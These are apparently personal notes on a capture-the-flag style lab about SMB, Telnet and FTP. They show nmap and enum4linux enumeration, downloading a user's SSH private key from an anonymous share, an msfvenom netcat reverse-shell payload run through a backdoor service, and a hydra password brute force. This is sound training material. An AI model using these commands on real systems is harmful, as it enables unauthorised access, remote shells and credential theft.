# Network Service

---

# SMB

server messge block protocol

client-server communication

## Task 2

### Recon

nmap scan

```bash
nmap -sC -sV 10.10.133.29
nmap -p 139,445 --script smb-os-discovery TARGET_IP

```

output

```bash
PORT STATE SERVICE VERSION

22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux)
| ssh-hostkey:
| 2048 91df5c7c26226e9023a77dfa5ce1c252 (RSA)
| 256 8657f52af7869ccf02c1acbc34906b01 (ECDSA)
|_ 256 81e3cce7c93c75d7fbe086a001417781 (ED25519)

139/tcp open netbios-ssn Samba smbd 3.X — 4.X (workgroup: WORKGROUP)

445/tcp open netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: POLOSMB; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 0s, deviation: 1s, median: 0s
|_nbstat: NetBIOS name: POLOSMB, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb2-time:
| date: 2023–05–05T15:42:34
|_ start_date: N/A
| smb-security-mode:
| account_used: guest
| authentication_level: user
| challenge_response: supported
|_ message_signing: disabled (dangerous, but default)
| smb2-security-mode:
| 311:
|_ Message signing enabled but not required
| smb-os-discovery:
| OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
| Computer name: polosmb
| NetBIOS computer name: POLOSMB\x00
| Domain name: \x00
| FQDN: polosm

```

SMB IS ON PORTS 139/445

NEXT RUN 

```bash
enum4linux -a ip_addr
```

results:

- Worgroup : workgroup
- machine name: POLOSMB
- OS VERSION/ 6.1
- SHRES THAT STICKS OUT :  profiles (under shre enumeration ou ip)

### Exploiting SMB

sytax to access smb share called “secret” as user “suit” 

```bash
smbclient //IP/share -U <username> -p <port>

smbclient //10.10.10.2/secret -U suit -p 445
```

run 

```bash

Syntax: smbclient //[IP]/[SHARE] -U [USERNAME] -p [PORT]

Example: smbclient //10.10.10.10/secrets -U Anonymous -p 445
```

```bash
smbclient //10.10.133.29/profiles -U Anonymous
ls
  .sh
   Working From Home Information.txt
   get "Working From Home Infromation.txt"
```

i find user John Cactus and he is allowed to use ssh

under .ssh

there is id_rsa

```bash
	get id_rsa
	(or) mget *. 
	chmod 600 id_rsa
	ssh cactus@10.10.133.29
```

the flag is in smb.txt

### Telnet

- Telnet is an **`Application protocol`** that allows you, with the use of a telnet client, to connect to and execute commands on a remote machine that’s hosting a telnet server.
- The telnet client will establish a connection with the server.
- The client will then become a virtual terminal- allowing you to interact with the remote host.

 been replaced by SSH where transmitted data is encrypted.

to connect telnet

```bash
telnet ip port
```

### Task 6 - Enumerating

```bash
nmap -T4 -p- -A 10.10.225.219
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-05 22:47 IST
Nmap scan report for 10.10.225.219 (10.10.225.219)
Host is up (0.18s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION

8012/tcp open  unknown
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
|_    SKIDY'S BACKDOOR. Type .HELP to view commands
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8012-TCP:V=7.93%I=7%D=5/5%Time=64553CAE%P=x86_64-pc-linux-gnu%r(NUL
SF:L,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands
SF:\n")%r(GenericLines,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x
SF:20view\x20commands\n")%r(GetRequest,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x
SF:20\.HELP\x20to\x20view\x20commands\n")%r(HTTPOptions,2E,"SKIDY'S\x20BAC
SF:KDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(RTSPRequest,2
SF:E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n"
SF:)%r(RPCCheck,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\
SF:x20commands\n")%r(DNSVersionBindReqTCP,2E,"SKIDY'S\x20BACKDOOR\.\x20Typ
SF:e\x20\.HELP\x20to\x20view\x20commands\n")%r(DNSStatusRequestTCP,2E,"SKI
SF:DY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(He
SF:lp,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20command
SF:s\n")%r(SSLSessionReq,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to
SF:\x20view\x20commands\n")%r(TerminalServerCookie,2E,"SKIDY'S\x20BACKDOOR
SF:\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(TLSSessionReq,2E,"
SF:SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")%r
SF:(Kerberos,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20
SF:commands\n")%r(SMBProgNeg,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x
SF:20to\x20view\x20commands\n")%r(X11Probe,2E,"SKIDY'S\x20BACKDOOR\.\x20Ty
SF:pe\x20\.HELP\x20to\x20view\x20commands\n")%r(FourOhFourRequest,2E,"SKID
SF:Y'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(LPD
SF:String,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20com
SF:mands\n")%r(LDAPSearchReq,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x
SF:20to\x20view\x20commands\n")%r(LDAPBindReq,2E,"SKIDY'S\x20BACKDOOR\.\x2
SF:0Type\x20\.HELP\x20to\x20view\x20commands\n")%r(SIPOptions,2E,"SKIDY'S\
SF:x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(LANDesk
SF:-RC,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20comman
SF:ds\n")%r(TerminalServer,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20
SF:to\x20view\x20commands\n")%r(NCP,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\
SF:.HELP\x20to\x20view\x20commands\n");
```

the service work on port  8012

![1_6tSntv4CYIboeQe1Wvt8cA.webp](d2215ced-aa38-41d0-aee0-dcb0e2e244df.png)

without the -p- tag no service is displayed and thats due to the fact that the service is not working in usual or popular port

![1_2yakW7SXAwvi1lFiFIsb2w.webp](1_2yakW7SXAwvi1lFiFIsb2w.webp)

that gives us two infos , one therer is a user “SKIDY” and there is a backdore of some sort

### Task 7 - Exploiting telnet

```bash
telnet <Machine-IP> 8012
```

![1_SduwFVDKHdGWskNJ_2M8vQ.webp](0b2f45df-4fd0-4b44-9f03-454a4d922a03.png)

.help shows that we can run commend like the following

```bash
.RUN <cm>
```

Let’s check to see if what we’re typing is being executed as a system command.

1. Let’s Start a tcpdump listener on your local machine.

**If using your own machine with the OpenVPN connection, use:**

- `sudo tcpdump ip proto \\icmp -i tun0`

**If using the AttackBox, use:**

- `sudo tcpdump ip proto \\icmp -i ens5`

![1_c-LfZzgM9TfCSoGKzv7JbA.webp](62a3a0d9-ce20-4587-a58d-5136b1e9e67e.png)

![1_HSojZ3wjcvYzfAH0-EPW3Q.gif](1_HSojZ3wjcvYzfAH0-EPW3Q.gif)

We’re going to generate a reverse shell payload using msfvenom. This will generate and encode a netcat reverse shell for us. Here’s our syntax:

```bash
msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R”
```

Paste that payload in telnet and excute it with .Run

run the listenr

```bash
nc -lvp [listening port]
```

### FTP

File Transfer Protocol (FTP) is, as the name suggests , a protocol used to allow remote transfer of files over a network. It uses a **`client-server`** model to do this, and- as we’ll come on to later- relays commands and data in a very efficient way.

A typical FTP session operates using two channels:

- a command (sometimes called the control) channel
- a data channel.

## Task 9 - ENUMURATING FTP

```bash
─$ nmap -sC 10.10.35.163  
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-06 11:27 IST
Nmap scan report for 10.10.35.163 (10.10.35.163)
Host is up (0.20s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
21/tcp open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0      353 Apr 24  2020 PUBLIC_NOTICE.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.11.36.171
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp open  http
|_http-title: Apache2 Ubuntu Default Page: It works
1. How many ports are open on the target machine?
Ans: 2
```

we notice a file in the anonymous ftp directory PUBLIC_NOTICE.txt

also anonymous login is allowed

```bash
ftp Anonymous@10.10.35.136
get PUBLIC_NOTICE.txt
```

we find user Mike

## task 10 - exploiting ftp

crack the password of mike

```bash
hydra -l mike -P /usr/share/wordlists/rockyou.txt -t 4 <MACHINE-IP> ftp
```

ans: password

```bash
ftp mike@10.10.35.163
get ftp.txt
```